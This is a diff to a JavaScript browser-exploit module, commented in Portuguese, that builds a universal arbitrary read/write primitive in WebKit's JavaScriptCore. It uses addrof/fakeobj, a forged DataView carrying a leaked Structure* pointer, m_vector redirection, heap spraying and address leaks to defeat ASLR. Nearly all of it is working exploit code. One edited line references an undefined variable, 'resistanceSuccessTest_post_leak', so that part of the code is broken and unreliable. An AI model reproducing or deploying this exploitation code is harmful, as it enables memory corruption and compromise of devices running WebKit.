@@ -1,4 +1,4 @@
-// js/script3/testArrayBufferVictimCrash.mjs (v131 - Refinando Dump e Hardcoding de Structure*)
+// js/script3/testArrayBufferVictimCrash.mjs (v131 - Refinando Dump e Vazamento Dinâmico de Structure*)
 // =======================================================================================
 // ESTRATÉGIA ATUALIZADA PARA ROBUSTEZ MÁXIMA E VAZAMENTO REAL E LIMPO DE ASLR:
 // - AGORA UTILIZA PRIMITIVAS addrof/fakeobj para construir ARB R/W UNIVERSAL.
@@ -21,7 +21,7 @@ import {
 
 import { JSC_OFFSETS, WEBKIT_LIBRARY_INFO } from '../config.mjs';
 
-export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v131_R60_ARB_RW_UNIVERSAL_HARDCODED_STRUCTURE_NO_DUMP";
+export const FNAME_MODULE_TYPEDARRAY_ADDROF_V82_AGL_R43_WEBKIT = "Uncaged_StableRW_v131_R60_ARB_RW_UNIVERSAL_DYNAMIC_STRUCTURE";
 
 const LOCAL_SHORT_PAUSE = 50;
 const LOCAL_MEDIUM_PAUSE = 500;
@@ -49,13 +49,13 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
     logFn(`[${FNAME}] Iniciando configuração da primitiva de L/E Arbitrária Universal via fake DataView...`, "subtest", FNAME);
 
     try {
-        // --- NOVO: Vazar a Structure* de um DataView real ---
+        // --- NOVO: Vazar a Structure* de um DataView real para usar no fakeobj ---
         const real_data_view_for_leak = new DataView(new ArrayBuffer(16)); // Crie um DataView real
         const real_data_view_addr = addrof_core(real_data_view_for_leak); // Obtenha o endereço do DataView real
         logFn(`[${FNAME}] Endereço do DataView real para vazamento de Structure*: ${real_data_view_addr.toString(true)}`, "leak", FNAME);
         await pauseFn(LOCAL_SHORT_PAUSE);
 
-        // Leia o ponteiro da Structure* no offset 0x8 do DataView real
+        // Leia o ponteiro da Structure* no offset 0x8 do DataView real (JSCell.STRUCTURE_POINTER_OFFSET)
         const real_data_view_structure_ptr_addr = real_data_view_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET);
         const REAL_DATA_VIEW_STRUCTURE_PTR = await arb_read_universal_js_heap(real_data_view_structure_ptr_addr, 8, logFn);
 
@@ -84,7 +84,7 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
         await pauseFn(LOCAL_SHORT_PAUSE);
 
         // 2. Preencher os campos do objeto de apoio na memória usando `arb_write` (a primitiva atual).
-        // Usaremos o Structure* VAZADO diretamente aqui.
+        // AGORA USAMOS O PONTEIRO DA STRUCTURE* REAL QUE VAZAMOS DINAMICAMENTE.
         await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET), REAL_DATA_VIEW_STRUCTURE_PTR, 8);
         logFn(`[${FNAME}] Ponteiro da Structure* (${REAL_DATA_VIEW_STRUCTURE_PTR.toString(true)}) plantado no offset 0x${JSC_OFFSETS_PARAM.JSCell.STRUCTURE_POINTER_OFFSET.toString(16)} do objeto de apoio.`, "info", FNAME);
 
@@ -147,15 +147,11 @@ async function setupUniversalArbitraryReadWrite(logFn, pauseFn, JSC_OFFSETS_PARA
         return false;
     } finally {
         // SEMPRE resetar o m_vector no final para evitar crashes inesperados, mesmo em caso de erro.
-        if (_fake_data_view && fake_dv_backing_object_addr) {
+        // Verifica se fake_dv_backing_object_addr está definido para evitar ReferenceError.
+        if (_fake_data_view && typeof fake_dv_backing_object_addr !== 'undefined') {
             try {
-                // Certifique-se de que fake_dv_backing_object_addr esteja definido para esta parte.
-                // Isso pode ser um problema se o erro ocorreu antes da definição.
-                // Adicione uma verificação para evitar ReferenceError aqui também.
-                if (typeof fake_dv_backing_object_addr !== 'undefined') {
-                    await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET), AdvancedInt64.Zero, 8);
-                    logFn(`[${FNAME}] m_vector do DataView forjado resetado.`, "debug", FNAME);
-                }
+                await arb_write(fake_dv_backing_object_addr.add(JSC_OFFSETS_PARAM.ArrayBufferView.M_VECTOR_OFFSET), AdvancedInt64.Zero, 8);
+                logFn(`[${FNAME}] m_vector do DataView forjado resetado.`, "debug", FNAME);
             } catch (e_reset) {
                 logFn(`[${FNAME}] ERRO ao resetar m_vector: ${e_reset.message}. Pode causar crash posterior.`, "error", FNAME);
             }
@@ -174,7 +170,7 @@ export async function arb_read_universal_js_heap(address, byteLength, logFn) {
         throw new Error("Universal ARB R/W (JS heap) primitive not initialized.");
     }
     // Redirecionar o m_vector do DataView forjado para o endereço desejado
-    const fake_dv_backing_object_addr = addrof_core(_fake_data_view); // Endereço do objeto que serve de corpo para o _fake_data_view
+    const fake_dv_backing_object_addr = addrof_core(_fake_data_view);
     const M_VECTOR_OFFSET_IN_BACKING_OBJECT = fake_dv_backing_object_addr.add(JSC_OFFSETS.ArrayBufferView.M_VECTOR_OFFSET);
 
     await arb_write(M_VECTOR_OFFSET_IN_BACKING_OBJECT, address, 8); // Manipula o corpo do fake DataView para apontar para 'address'
@@ -269,10 +265,6 @@ export async function testIsolatedAddrofFakeobjCoreAndDump_from_script3(logFn, p
         // --- DUMP DE MEMÓRIA DO OBJETO (REMOVIDO PARA REDUZIR VERBOSIDADE, MANTEMOS APENAS LEITURA DA STRUCTURE*) ---
         logFn(`[${FNAME}] OBS: Dump de memória completo do objeto temporariamente desabilitado para reduzir verbosidade.`, "info", FNAME);
 
-        // --- Leitura da Structure* após o dump (ainda deve falhar, mas é um teste) ---
-        // Removida esta parte pois a arb_read antiga não funcionava no heap JS e causava confusão.
-        // A lógica de vazamento de Structure* agora está no setupUniversalArbitraryReadWrite.
-
         // --- Verificação funcional de fakeobj_core ---
         const faked_object_test = fakeobj_core(object_addr);
         if (faked_object_test && typeof faked_object_test === 'object') {
@@ -325,7 +317,6 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
         }
         logFn("Primitivas arb_read/arb_write (OLD PRIMITIVE) validadas com sucesso. Prosseguindo com a exploração.", "good");
         await pauseFn(LOCAL_MEDIUM_PAUSE);
-
 
         // --- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---
         logFn("--- FASE 1: Estabilização Inicial do Heap (Spray de Objetos) ---", "subtest");
@@ -504,7 +495,7 @@ export async function executeTypedArrayVictimAddrofAndWebKitLeak_R43(logFn, paus
             logFn(`SUCESSO TOTAL: Teste de resistência PÓS-VAZAMENTO concluído. ${resistanceSuccessCount_post_leak}/${numResistanceTests} operações bem-sucedidas.`, "good");
         } else {
             logFn(`ALERTA: Teste de resistência PÓS-VAZAMENTO concluído com ${numResistanceTests - resistanceSuccessCount_post_leak} falhas.`, "warn");
-            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessCount_post_leak})`;
+            final_result.message += ` (Teste de resistência L/E pós-vazamento com falhas: ${numResistanceTests - resistanceSuccessTest_post_leak})`;
         }
         logFn(`Verificação funcional de L/E e Teste de Resistência PÓS-VAZAMENTO concluídos. Time: ${(performance.now() - rwTestPostLeakStartTime).toFixed(2)}ms`, "info");
 
